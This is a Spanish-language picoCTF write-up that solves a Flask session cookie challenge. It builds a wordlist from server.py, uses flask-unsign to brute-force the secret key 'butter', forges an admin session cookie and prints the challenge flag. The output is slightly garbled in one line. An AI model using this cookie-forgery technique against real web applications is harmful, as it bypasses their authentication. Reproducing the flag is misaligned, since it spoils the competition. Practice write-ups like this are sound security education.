## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)
## Solución
1. Vemos el código de python que nos dan con `nano server.py` y vemos que es código de flask
2. La página cambia si le damos una cookie en específico
3. Movemos las galletas del server.py a un archivo  `cat server.py > galletas.txt`
```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```
4. Corremos `sudo apt install python3-pip` para instalar pip
5. Instalamos 'venv' con `sudo apt install python3-venv`
6. Hacemos un entorno virtual en el home `python3 -m venv ~/.venv`
7. Activamos el entorno virtual e instalamos flask-unsign
```shell
source ~/.venv/bin/activate

python3 -m pip install flask-unsign
```
8. Con flask-unsign vamos a "desfirmar" la cookie 
```shell
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-sc0g.VCokKagV06LCZ4O1PabCqpFBtkw" --wordlist galletas.txt

[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter'
```
9. Decodificamos la cookie
```shell
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "butter"

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-sekw.BRRngFerxbynhcWrEt6uh-5Q46A
```
10. En el navegador podemos modificar el valor de la cookie "session" y nos da la bandera
```
Flag 
picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}
```
## Notas adicionales
## Referencias
https://www.tecmint.com/install-pip-in-linux/
https://github.com/Paradoxis/Flask-Unsign